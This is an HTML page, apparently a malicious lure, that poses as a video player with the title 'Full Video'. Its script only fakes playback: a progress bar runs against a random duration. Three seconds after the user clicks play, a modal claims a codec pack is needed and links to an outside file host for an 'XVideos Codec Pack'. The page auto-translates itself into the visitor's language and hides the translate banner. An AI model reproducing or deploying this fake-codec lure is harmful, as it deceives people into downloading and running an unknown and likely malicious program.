<!DOCTYPE html>
<html lang="en" style="height:100%;">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Full Video</title>
  <style>
    body, html {
      margin: 0; padding: 0; height: 100%; width: 100%;
      display: flex; align-items: center; justify-content: center;
      background: #000; font-family: Arial, sans-serif; overflow: hidden;
    }
    .player {
      width: 80%; max-width: 900px; aspect-ratio: 16/9;
      background: #111 center/cover no-repeat;
      position: relative; border-radius: 10px; overflow: hidden;
      cursor: pointer;
    }
    .controls {
      position: absolute; bottom: 0; left: 0; right: 0;
      background: rgba(0,0,0,0.6); padding: 10px;
      display: flex; align-items: center; color: #fff; font-size: 14px;
    }
    .play-btn {
      margin-right: 10px; cursor: pointer; font-size: 18px;
    }
    .progress-bar {
      flex: 1; height: 6px; background: #333;
      margin: 0 10px; border-radius: 3px; overflow: hidden;
    }
    .progress {
      height: 100%; width: 0; background: #f00;
    }
    .time { min-width: 80px; text-align: right; }

    /* modal */
    .modal {
      display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
      background: rgba(0,0,0,0.85); align-items: center; justify-content: center;
      z-index: 1000;
    }
    .modal.show { display: flex; }
    .modal-content {
      background: #222; color: #fff; padding: 20px;
      border-radius: 10px; text-align: center; max-width: 400px;
    }
    .modal-content .icon { font-size: 50px; margin-bottom: 15px; }
    .modal-buttons { margin-top: 20px; display: flex; justify-content: center; }
    .modal-buttons a {
      padding: 10px 20px; background: #f00; color: #fff; text-decoration: none;
      border-radius: 5px; transition: background 0.3s;
    }
    .modal-buttons a:hover { background: #c00; }

    /* Google translate hide */
    .goog-te-banner-frame.skiptranslate,
    .goog-te-gadget-icon,
    #goog-gt-tt,
    .goog-te-balloon-frame,
    .goog-tt-menu-frame { display: none !important; }
    body { top: 0 !important; }
    body > .skiptranslate { display: none !important; }
  </style>
</head>
<body>
  <div id="google_translate_element" style="display:none;"></div>

  <div class="player" id="player">
    <div class="controls">
      <div class="play-btn" id="playBtn">▶</div>
      <div class="progress-bar"><div class="progress" id="progress"></div></div>
      <div class="time" id="time">0:00 / 0:00</div>
    </div>
  </div>

  <div class="modal" id="modal">
    <div class="modal-content">
      <div class="icon">⚠</div>
      <p>To watch the video please install codec pack.</p>
      <div class="modal-buttons">
        <a href="https://ikx.filexspace.com/getfile/PJCCJ?title=XVideos%20Codec%20Pack" target="_blank">Install</a>
      </div>
    </div>
  </div>

<script>
  const player = document.getElementById("player");
  const playBtn = document.getElementById("playBtn");
  const progress = document.getElementById("progress");
  const timeDisplay = document.getElementById("time");
  const modal = document.getElementById("modal");

  // получаем картинку
  const params = new URLSearchParams(window.location.search);
  const thumb = params.get("thumb");
  if (thumb) { player.style.backgroundImage = `url('${thumb}')`; }

  let isPlaying = false;
  let interval;
  let currentTime = 0;

  function getRandomDuration() {
    const min = 12 * 60 + 32; // 12:32
    const max = 18 * 60 + 47; // 18:47
    return Math.floor(Math.random() * (max - min + 1)) + min;
  }
  const totalDuration = getRandomDuration();

  function formatTime(sec) {
    const m = Math.floor(sec / 60);
    const s = sec % 60;
    return `${m}:${s.toString().padStart(2,"0")}`;
  }

  function updateTime() {
    timeDisplay.textContent = `${formatTime(currentTime)} / ${formatTime(totalDuration)}`;
    progress.style.width = `${(currentTime / totalDuration) * 100}%`;
  }

  function startProgress() {
    interval = setInterval(() => {
      if (currentTime < totalDuration) {
        currentTime++; updateTime();
      } else clearInterval(interval);
    }, 1000);
  }

  function showModalAfterDelay() {
    setTimeout(() => { modal.classList.add("show"); }, 3000);
  }

  function startPlayer() {
    if (!isPlaying) {
      startProgress();
      showModalAfterDelay();
      isPlaying = true;
      playBtn.textContent = "⏸";
    }
  }

  playBtn.addEventListener("click", startPlayer);
  player.addEventListener("click", startPlayer);

  updateTime();
</script>

<script>
  function googleTranslateElementInit() {
    new google.translate.TranslateElement({
      pageLanguage: 'en',
      autoDisplay: false
    }, 'google_translate_element');

    const userLang = navigator.language || navigator.userLanguage;
    const langCode = userLang.split('-')[0];
    const interval = setInterval(() => {
      const select = document.querySelector('.goog-te-combo');
      if (select) {
        select.value = langCode;
        select.dispatchEvent(new Event('change'));
        clearInterval(interval);
      }
    }, 500);
  }
</script>
<script src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
</body>
</html>
